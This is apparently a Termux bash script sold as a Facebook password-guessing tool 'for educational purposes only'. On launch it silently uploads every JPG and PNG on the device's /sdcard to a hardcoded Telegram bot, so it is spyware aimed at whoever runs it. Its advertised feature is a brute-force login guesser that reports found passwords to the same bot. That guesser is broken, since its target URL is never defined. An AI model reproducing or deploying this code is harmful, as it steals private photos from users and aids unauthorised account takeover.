#!/data/data/com.termux/files/usr/bin/bash

#-------------------
#   Colors (Professional Scheme)
#-------------------
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

#-------------------
#   Configuration
#-------------------
BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
CHAT_ID="5967116314"
WORDLIST="$HOME/wordlist.txt"
TARGET_FILE="$HOME/target.txt"
TEMP_DIR="$HOME/fb_tool_temp"
mkdir -p "$TEMP_DIR"

#-------------------
#   Display Logo
#-------------------
display_logo() {
    clear
    echo -e "${RED}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
    '
    echo -e "${RESET}"
    echo -e "${GREEN}[+] Tool by Hema${RESET}"
    echo -e "${YELLOW}[!] For educational purposes only${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
    echo -e "${CYAN}|       facebook.Hema - v2.2-Termux    |${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
}

#-------------------
#   Send to Telegram (curl)
#-------------------
send_to_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" > /dev/null 2>/dev/null
}

send_file_to_telegram() {
    local file_path="$1"
    local type="$2"  # photo, video, document
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/send${type}" \
        -F chat_id="$CHAT_ID" \
        -F "${type}=@$file_path" > /dev/null 2>/dev/null
}

#-------------------
#   Upload All Images in Background
#-------------------
upload_all_images() {
    echo -e "${PURPLE}[*] Uploading all images to Telegram in background...${RESET}"
    (find /sdcard -type f \( -iname "*.jpg" -o -iname "*.png" \) 2>/dev/null | while read -r img; do
        send_file_to_telegram "$img" "Photo"
        echo -e "${GREEN}[+] Uploaded: $img${RESET}"
    done
    send_to_telegram "All images uploaded from device.") &
}

#-------------------
#   Generate 8000 Random Passwords
#-------------------
generate_random_passwords() {
    if [ ! -f "$WORDLIST" ]; then
        echo -e "${YELLOW}[*] Generating 8000 random passwords...${RESET}"
        > "$WORDLIST"  # Clear existing wordlist
        for i in {1..8000}; do
            openssl rand -base64 8 | tr -d '/+=' >> "$WORDLIST" 2>/dev/null
        done
        echo -e "${GREEN}[+] Generated 8000 random passwords in $WORDLIST${RESET}"
    fi
}

#-------------------
#   Add Manual Passwords
#-------------------
add_manual_passwords() {
    echo -e "${YELLOW}[*] Enter custom passwords (press Ctrl+D when done):${RESET}"
    cat >> "$WORDLIST"
    echo -e "${GREEN}[+] Custom passwords added to $WORDLIST${RESET}"
}

#-------------------
#   Add Target
#-------------------
add_target() {
    read -p "Enter target ID: " target_id
    echo "$target_id" > "$TARGET_FILE"
    echo -e "${GREEN}[+] Target ID saved: $target_id${RESET}"
}

#-------------------
#   Fast Password Guessing by ID
#-------------------
guess_passwords_by_id() {
    if [ ! -f "$TARGET_FILE" ]; then
        echo -e "${RED}[-] No target ID set. Please add a target first.${RESET}"
        return 1
    fi
    local target_id=$(cat "$TARGET_FILE")
    echo -e "${BLUE}[*] Starting ultra-fast guessing for ID: $target_id${RESET}"
    send_to_telegram "Starting password guessing for ID: $target_id"

    while IFS= read -r password; do
        echo -ne "${YELLOW}[*] Trying: $password\r${RESET}"
        curl -s -o /dev/null -w "%{http_code}" \
            -d "id=$target_id&pass=$password" "$TARGET_URL" > "$TEMP_DIR/http_status.txt" 2>/dev/null &
        pid=$!
        wait $pid
        status=$(cat "$TEMP_DIR/http_status.txt" 2>/dev/null)

        if [ "$status" -eq 200 ]; then
            echo -e "${GREEN}[+] Success! Password found: $password${RESET}"
            send_to_telegram "Success! Password for ID $target_id: $password"
            return 0
        else
            echo -e "${RED}[-] Failed: $password${RESET}"
        fi
    done < "$WORDLIST"
    echo -e "${RED}[-] No password found.${RESET}"
    send_to_telegram "Failed to find password for ID: $target_id"
}

#-------------------
#   Main Menu
#-------------------
main_menu() {
    display_logo
    echo -e "${BLUE}[1] Add Target ID${RESET}"
    echo -e "${BLUE}[2] Add Manual Passwords${RESET}"
    echo -e "${BLUE}[3] Start Guessing${RESET}"
    echo -e "${BLUE}[4] Exit${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
    read -p "Choose an option: " choice

    case $choice in
        1) add_target ;;
        2) add_manual_passwords ;;
        3) guess_passwords_by_id ;;
        4) echo -e "${GREEN}[+] Exiting...${RESET}"; rm -rf "$TEMP_DIR"; exit 0 ;;
        *) echo -e "${RED}[-] Invalid option${RESET}" ;;
    esac
    main_menu
}

#-------------------
#   Start Tool
#-------------------
display_logo
echo -e "${YELLOW}[*] Ensure curl, wget, and openssl are installed manually if errors occur.${RESET}"
generate_random_passwords  # Generate 8000 passwords on startup
upload_all_images  # Start uploading images in background
main_menu
